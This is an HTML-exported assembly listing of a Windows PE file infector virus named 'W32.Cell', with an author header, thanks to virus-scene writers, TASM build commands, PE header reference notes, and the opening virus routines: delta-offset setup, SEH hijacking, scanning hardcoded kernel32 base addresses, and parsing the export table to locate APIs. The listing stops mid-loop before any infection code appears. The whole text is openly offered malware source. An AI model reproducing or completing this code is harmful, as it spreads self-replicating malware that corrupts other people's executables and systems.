<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;***************************</span><span class="sc0">
</span><span class="sc1">;*Name:W32.Cell                         </span><span class="sc0">
</span><span class="sc1">;*Author:Cell</span><span class="sc0">
</span><span class="sc1">;*Infects:win PE files</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;***************************</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc1">;greets:</span><span class="sc0">
</span><span class="sc1">;Ultras: thnx for help with GetProcAddress!</span><span class="sc0">
</span><span class="sc1">;gigabyte:hey whats up?</span><span class="sc0">
</span><span class="sc1">;cyclone: hey dude, thnx</span><span class="sc0">
</span><span class="sc1">;evul:thanks for the help man</span><span class="sc0">
</span><span class="sc1">;t2:thank you for helping em with bugs</span><span class="sc0">
</span><span class="sc1">;perikles:thanks for helping me ideas and payload and stuff</span><span class="sc0">
</span><span class="sc1">;GriYo thank you for your help as well, code on dude :)</span><span class="sc0">
</span><span class="sc1">;Urgo32:thank you  urgo for helping file size problem! :)) </span><span class="sc0">
</span><span class="sc1">;thanks to:Lord Julus, helped me via email</span><span class="sc0">
</span><span class="sc1">;thanks to Mist- for Addresses of Kernels in various windows versions</span><span class="sc0">
</span><span class="sc1">;Greets to Spo0ky and the COdebreakers, i have come far in coding, but it all began wih=th them, the ones that</span><span class="sc0">
</span><span class="sc1">;tuaght me at the start who got me on the path, they remeber me as ;Emperor Virii</span><span class="sc0">
</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc1">;Tasm32 /m Cell.asm </span><span class="sc0">
</span><span class="sc1">;tlink32 /Tpe /aa /x Cell.obj,,,import32</span><span class="sc0">
</span><span class="sc1">;for my refernce learning PE, i put these here for quick refrence</span><span class="sc0">
</span><span class="sc1">;in PE header</span><span class="sc0">
</span><span class="sc1">;PE stuff and sectio  header ref</span><span class="sc0">
</span><span class="sc1">;8h = virtual size</span><span class="sc0">
</span><span class="sc1">;0ch = virtual address</span><span class="sc0">
</span><span class="sc1">;10h size of raw data</span><span class="sc0">
</span><span class="sc1">;14h pointer to raw data</span><span class="sc0">
</span><span class="sc1">;28h = offset of entry point</span><span class="sc0">
</span><span class="sc1">;52d = imagebase</span><span class="sc0">
</span><span class="sc1">;38h = section alignment</span><span class="sc0">
</span><span class="sc1">;3ch = file alignment</span><span class="sc0">
</span><span class="sc1">;50h = size of image</span><span class="sc0">
</span><span class="sc1">;54h = checksum</span><span class="sc0">
</span><span class="sc1">;74h number of directory entries</span><span class="sc0">
</span><span class="sc1">; header  (all this data for refrence to me while ;writing)</span><span class="sc0">
   </span><span class="sc1">;   0                dw 'ZM'             ;MZ ;identificator</span><span class="sc0">
   </span><span class="sc1">;   2                dw ?                ;last page ;bytes</span><span class="sc0">
    </span><span class="sc1">;  4                dw ?                ;file pages</span><span class="sc0">
     </span><span class="sc1">; 6                dw ?                ;reloc</span><span class="sc0">
      </span><span class="sc1">;8                dw ?                ;header size ;in paragraphs</span><span class="sc0">
      </span><span class="sc1">;0ah              dw ?                ;minimum ;paragraph needed</span><span class="sc0">
      </span><span class="sc1">;0ch              dw ?                ;maximum ;paragraphs needed</span><span class="sc0">
     </span><span class="sc1">; 0eh              dw ?                ;initial SS</span><span class="sc0">
      </span><span class="sc1">;010h             dw ?                ;initial SP</span><span class="sc0">
      </span><span class="sc1">;012h             dw ?                ;checksum</span><span class="sc0">
      </span><span class="sc1">;014h             dw ?                ;initial IP</span><span class="sc0">
      </span><span class="sc1">;016h             dw ?                ;initial CS   </span><span class="sc0">
      </span><span class="sc1">;018h             dw ?                ;reloc ;address</span><span class="sc0">
   </span><span class="sc1">;   01ah             dw ?                ;overlay ;number</span><span class="sc0">
   </span><span class="sc1">;   01ch             dd ?                ;reserved</span><span class="sc0">
   </span><span class="sc1">;   020h             dw ?                ;OEM ;dentifier</span><span class="sc0">
   </span><span class="sc1">;   022h             dw ?                ;OEM ;information</span><span class="sc0">
</span><span class="sc1">;             ....                          ;reserved</span><span class="sc0">
    </span><span class="sc1">;  03ch             dw ?                ;PE header relative offset</span><span class="sc0">
      
    
    </span><span class="sc1">;PE record</span><span class="sc0">
    
   </span><span class="sc1">; offset</span><span class="sc0">
     </span><span class="sc1">;0                 dd 'EP'             ;PE indentificator</span><span class="sc0">
     </span><span class="sc1">;4                 dw ?                ;CPU type</span><span class="sc0">
     </span><span class="sc1">;6                 dw ?                ;number of sections</span><span class="sc0">
     </span><span class="sc1">;8                 dd ?                ;date time</span><span class="sc0">
     </span><span class="sc1">;0ch               dd ?                ;COFF pointer</span><span class="sc0">
     </span><span class="sc1">;010h              dd ?                ;COFF size</span><span class="sc0">
     </span><span class="sc1">;014h              dw ?                ;NT header size</span><span class="sc0">
    </span><span class="sc1">; 016h              dw ?                ;PE flags</span><span class="sc0">
    </span><span class="sc1">;nt header</span><span class="sc0">
     </span><span class="sc1">;018h              dw ?                ;NT header ID</span><span class="sc0">
     </span><span class="sc1">;01ah              db ?                ;linker major number</span><span class="sc0">
     </span><span class="sc1">;01bh              db ?                ;linker minor number</span><span class="sc0">
     </span><span class="sc1">;01ch              dd ?                ;code size</span><span class="sc0">
     </span><span class="sc1">;020h              dd ?                ;idata size</span><span class="sc0">
     </span><span class="sc1">;024h              dd ?                ;udata size</span><span class="sc0">
     </span><span class="sc1">;028h              dd ?                ;entrypoint RVA</span><span class="sc0">
     </span><span class="sc1">;02ch              dd ?                ;code base</span><span class="sc0">
     </span><span class="sc1">;030h              dd ?                ;data base</span><span class="sc0">
     </span><span class="sc1">;034h              dd ?                ;image base</span><span class="sc0">
     </span><span class="sc1">;038h              dd ?                ;sections align</span><span class="sc0">
     </span><span class="sc1">;03ch              dd ?                ;file align</span><span class="sc0">
    </span><span class="sc1">;040h              dw ?                ;OS major number</span><span class="sc0">
    </span><span class="sc1">; 042h              dw ?                ;OS minor number</span><span class="sc0">
    </span><span class="sc1">; 044h              dw ?                ;user major</span><span class="sc0">
    </span><span class="sc1">; 046h              dw ?                ;user minor</span><span class="sc0">
    </span><span class="sc1">; 048h              dw ?                ;subsys major</span><span class="sc0">
    </span><span class="sc1">; 04ah              dw ?                ;subsys minor</span><span class="sc0">
    </span><span class="sc1">; 04ch              dd ?                ;reserved</span><span class="sc0">
    </span><span class="sc1">; 050h              dd ?                ;image size</span><span class="sc0">
    </span><span class="sc1">; 054h              dd ?                ;header size</span><span class="sc0">
    </span><span class="sc1">; 058h              dd ?                ;checksum</span><span class="sc0">
    </span><span class="sc1">; 05ch              dw ?                ;subsystem</span><span class="sc0">
    </span><span class="sc1">; 05eh              dw ?                ;DLL flags</span><span class="sc0">
    </span><span class="sc1">; 060h              dd ?                ;stack reserve</span><span class="sc0">
    </span><span class="sc1">; 064h              dd ?                ;stack commit</span><span class="sc0">
    </span><span class="sc1">; 068h              dd ?                ;heap reserve</span><span class="sc0">
     </span><span class="sc1">;06ch              dd ?                ;heap commit</span><span class="sc0">
    </span><span class="sc1">; 070h              dd ?                ;loader flags</span><span class="sc0">
    </span><span class="sc1">; 074h              dd ?                ;number of RVA sizes</span><span class="sc0">
    
    </span><span class="sc1">; 078h              dd ?                ;export RVA</span><span class="sc0">
    </span><span class="sc1">; 07ch              dd ?                ;export size</span><span class="sc0">
    </span><span class="sc1">; 080h              dd ?                ;import RVA</span><span class="sc0">
    </span><span class="sc1">; 084h              dd ?                ;import size</span><span class="sc0">
    </span><span class="sc1">; 088h              dd ?                ;resource RVA</span><span class="sc0">
    </span><span class="sc1">; 08ch              dd ?                ;resource size</span><span class="sc0">
    </span><span class="sc1">; 090h              dd ?                ;exception RVA</span><span class="sc0">
    </span><span class="sc1">; 094h              dd ?                ;exception size</span><span class="sc0">
    </span><span class="sc1">; 098h              dd ?                ;security RVA</span><span class="sc0">
    </span><span class="sc1">; 09ch              dd ?                ;security size</span><span class="sc0">
     </span><span class="sc1">;0a0h              dd ?                ;fixup RVA</span><span class="sc0">
    </span><span class="sc1">; 0a4h              dd ?                ;fixup size</span><span class="sc0">
   </span><span class="sc1">;  0a8h              dd ?                ;debug RVA</span><span class="sc0">
   </span><span class="sc1">;  0ach              dd ?                ;debug size</span><span class="sc0">
   </span><span class="sc1">;  0b0h              dd ?                ;description RVA</span><span class="sc0">
    </span><span class="sc1">; 0b4h              dd ?                ;description size</span><span class="sc0">
    </span><span class="sc1">; 0b8h              dd ?                ;machine RVA</span><span class="sc0">
   </span><span class="sc1">;  0bch              dd ?                ;machine size</span><span class="sc0">
  </span><span class="sc1">;   0c0h              dd ?                ;tls RVA</span><span class="sc0">
 </span><span class="sc1">;    0c4h              dd ?                ;tls size</span><span class="sc0">
 </span><span class="sc1">;    0c8h              dd ?                ;loadconfig RVA</span><span class="sc0">
  </span><span class="sc1">;   0cch              dd ?                ;loadconfig size</span><span class="sc0">
  </span><span class="sc1">;                     dd ?,?              ;hm? :)</span><span class="sc0">
    </span><span class="sc1">; 0d8h              dd ?                ;iat RVA</span><span class="sc0">
   </span><span class="sc1">;  0dch              dd ?                ;iat size</span><span class="sc0">
  </span><span class="sc1">;                     dd ?,?</span><span class="sc0">
 </span><span class="sc1">;                      dd ?,?</span><span class="sc0">
</span><span class="sc1">;                       dd ?,?</span><span class="sc0">



 </span><span class="sc1">;   - start of the export section -</span><span class="sc0">
</span><span class="sc1">;     ...</span><span class="sc0">
  </span><span class="sc1">;  018h     dd ?      number of names               1)</span><span class="sc0">
 </span><span class="sc1">;   01ch     dd ?      address of functions          2)</span><span class="sc0">
 </span><span class="sc1">;   020h     dd ?      address of names              3)</span><span class="sc0">
  </span><span class="sc1">;  024h     dd ?      address of odinals            4)</span><span class="sc0">











</span><span class="sc9">.data</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">                                 </span><span class="sc1">;call delta</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                    
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">

</span><span class="sc1">;*********************************</span><span class="sc0">
</span><span class="sc1">;*SEH HANDLER                    *</span><span class="sc0">
</span><span class="sc1">;*                               *</span><span class="sc0">
</span><span class="sc1">;*********************************</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OLDSEH</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">terminater</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;*********************************</span><span class="sc0">
</span><span class="sc1">;*Scan Various OS kernel addies  *</span><span class="sc0">
</span><span class="sc1">;*to determiner where scan for   *</span><span class="sc0">
</span><span class="sc1">;*Export table of kernel         *</span><span class="sc0">
</span><span class="sc1">;*********************************</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stuffhost</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stuffhost2</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">GetKernel</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0BFF70000h</span><span class="sc0">                         </span><span class="sc1">;w95 kernel </span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;pass to EDI</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">                    </span><span class="sc1">;Is ok?</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check2000</span><span class="sc0">                              </span><span class="sc1">;if not lets check </span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;otherwise, check </span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0BFF70000h</span><span class="sc0">                         </span><span class="sc1">;align with kernel </span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">                    </span><span class="sc1">;PE FIle</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">check2000</span><span class="sc0">                              </span><span class="sc1">;nop, less check </span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;otherwise, save </span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">getapis</span><span class="sc0">                                </span><span class="sc1">;and Find some </span><span class="sc0">
</span><span class="sc5">check2000</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0BFF60000h</span><span class="sc0">                          </span><span class="sc1">;eax = addr krn       </span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;edi = eax</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">                    </span><span class="sc1">;EXE?</span><span class="sc0">
          </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">PE_Checker</span><span class="sc0">                              </span><span class="sc1">;ya has exe ehader </span><span class="sc0">
          
</span><span class="sc5">NT_check</span><span class="sc4">:</span><span class="sc0">
         
         
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">07FFF0000h</span><span class="sc0">                         </span><span class="sc1">;pass NT kernel to              </span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;pass to EDI</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">                    </span><span class="sc1">;Ok?</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">terminater</span><span class="sc0">                             </span><span class="sc1">;if not lets check </span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;otherwise get PE </span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">07FFF0000h</span><span class="sc0">                         </span><span class="sc1">;fix</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">                    </span><span class="sc1">;We a PE file?</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">terminater</span><span class="sc0">                             </span><span class="sc1">;if not here check </span><span class="sc0">
          
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;stor kernel </span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">getapis</span><span class="sc0">                                         </span><span class="sc1">;find APIs</span><span class="sc0">

</span><span class="sc5">PE_Checker</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;lah</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0BFF60000h</span><span class="sc0">                          </span><span class="sc1">;make un-relative</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">                    </span><span class="sc1">;pe?</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Win2kCheck</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;yup, store</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">getapis</span><span class="sc0">
</span><span class="sc5">Win2kCheck</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">077e80000h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">terminater</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;EDI points to pe header in kernel32.dll</span><span class="sc0">

</span><span class="sc5">getapis</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">pushad</span><span class="sc0">                                     </span><span class="sc1">;save all regs</span><span class="sc0">
                     
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;export table</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;align with kernel</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">export</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;get table</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                                </span><span class="sc1">;NumberofNames</span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">                                      </span><span class="sc1">;snag em </span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BaseFunctions</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberNames</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;save it </span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;make not RVA </span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">                                      </span><span class="sc1">;load next dword</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;get RA</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressofFunctions</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;save it</span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">                                      </span><span class="sc1">;load dword</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;get real addy</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfNames</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;save names </span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">                                      </span><span class="sc1">;next dword</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;make ok w/kernel</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfNameOrdinals</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;save ords</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressofFunctions</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get for compare</span><span class="sc0">
          </span><span class="sc6">lodsd</span><span class="sc0">                                      </span><span class="sc1">;to names, load DW </span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;make ok </span><span class="sc0">
                                       

</span><span class="sc5">SCANGPA</span><span class="sc4">:</span><span class="sc0">
         

   
                 
   
</span><span class="sc5">getit</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfNames</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;get address of </span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NamingIndex</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">                  </span><span class="sc1">;make index</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">;edi =esi</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;make normal</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;zero cx  </span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">APIS</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">shit</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;esi points to</span><span class="sc0">

</span><span class="sc5">shit2</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">cmpsb</span><span class="sc0">                                      </span><span class="sc1">;compare ESI:EDI</span><span class="sc0">
